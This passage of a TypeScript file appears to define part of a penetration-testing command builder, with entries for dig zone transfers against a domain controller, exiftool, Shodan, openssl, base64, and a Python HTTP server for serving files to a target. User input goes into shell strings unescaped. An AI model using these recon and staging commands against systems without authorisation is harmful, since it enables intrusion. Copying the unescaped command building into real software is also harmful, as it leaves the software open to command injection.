      { id: 'type', label: 'Record Type', type: 'select', default: 'ANY', options: ['ANY','A','AAAA','MX','NS','TXT','CNAME','SOA','PTR','AXFR'] },
      { id: 'server', label: 'DNS Server', type: 'text', default: '', placeholder: '8.8.8.8 or DC IP for AXFR' },
    ],
    buildCommand(p) {
      const srv = p.server ? `@${p.server}` : '';
      return `dig ${srv} ${p.target} ${p.type || 'ANY'}`.trim();
    }
  },
  {
    id: 'exiftool', label: 'exiftool', category: 'osint',
    description: 'Extract metadata from files (images, docs)',
    install: 'sudo apt install libimage-exiftool-perl',
    referenceUrl: 'https://exiftool.org',
    params: [
      { id: 'file', label: 'File', type: 'text', default: '', placeholder: 'image.jpg or *.pdf' },
    ],
    buildCommand(p) {
      return `exiftool ${p.file}`;
    }
  },
  {
    id: 'shodan-cli', label: 'shodan CLI', category: 'osint',
    description: 'Shodan search from command line',
    install: 'pip3 install shodan && shodan init <API_KEY>',
    referenceUrl: 'https://cli.shodan.io',
    params: [
      { id: 'query', label: 'Search Query', type: 'text', default: '', placeholder: 'apache country:US' },
      { id: 'target', label: 'Target IP (for host info)', type: 'text', autoFill: 'ip', placeholder: 'or leave blank for search' },
    ],
    buildCommand(p) {
      if (p.target && !p.query) return `shodan host ${p.target}`;
      return `shodan search "${p.query}"`;
    }
  },

  // MISC
  {
    id: 'openssl', label: 'openssl', category: 'misc',
    description: 'SSL/TLS testing, cert inspection, encryption',
    install: 'sudo apt install openssl',
    referenceUrl: 'https://www.openssl.org/docs/man1.1.1/man1/',
    params: [
      { id: 'mode', label: 'Mode', type: 'select', default: 's_client', options: ['s_client','req -x509','genrsa','enc -aes256','dgst -sha256','base64'] },
      { id: 'target', label: 'Target', type: 'text', autoFill: 'url', placeholder: 'example.com:443 or filename' },
    ],
    buildCommand(p) {
      switch (p.mode) {
        case 's_client':    return `echo "" | openssl s_client -connect ${p.target} -showcerts 2>/dev/null | openssl x509 -noout -text`;
        case 'req -x509':   return `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`;
        case 'genrsa':      return `openssl genrsa -out private.pem 2048`;
        case 'enc -aes256': return `openssl enc -aes-256-cbc -salt -in ${p.target} -out ${p.target}.enc`;
        case 'dgst -sha256':return `openssl dgst -sha256 ${p.target}`;
        case 'base64':      return `openssl base64 -in ${p.target} -out ${p.target}.b64`;
        default: return `openssl ${p.mode} ${p.target}`;
      }
    }
  },
  {
    id: 'python-server', label: 'Python HTTP Server', category: 'misc',
    description: 'Serve files from current directory for target download',
    install: 'Built-in (python3)',
    referenceUrl: 'https://docs.python.org/3/library/http.server.html',
    params: [
      { id: 'port', label: 'Port', type: 'text', default: '80', placeholder: '80' },
    ],
    buildCommand(p) {
      return `python3 -m http.server ${p.port || 80}`;
    }
  },
  {
    id: 'base64-cli', label: 'base64 (CLI)', category: 'misc',
    description: 'Encode/decode base64 in shell',
    install: 'Built-in',
    referenceUrl: 'https://linux.die.net/man/1/base64',
    params: [
      { id: 'mode', label: 'Mode', type: 'select', default: 'encode', options: ['encode', 'decode'] },
      { id: 'input', label: 'Input String / File', type: 'text', default: '', placeholder: '"string" or filename' },
    ],
    buildCommand(p) {
      if (p.mode === 'decode') return `echo "${p.input}" | base64 -d`;
      return `echo -n "${p.input}" | base64`;
    }
  },
];

export function getToolById(id: string): Tool | undefined {
  return TOOLS.find(t => t.id === id);
}

export function getToolsByCategory(category: string): Tool[] {
  return TOOLS.filter(t => t.category === category);
}

export function buildCommand(toolId: string, params: Record<string, string>): string {
  const tool = getToolById(toolId);
  if (!tool) return `# Unknown tool: ${toolId}`;
  try {
    return tool.buildCommand(params);
  } catch (e: unknown) {
    return `# Error building command: ${e instanceof Error ? e.message : String(e)}`;
  }
}
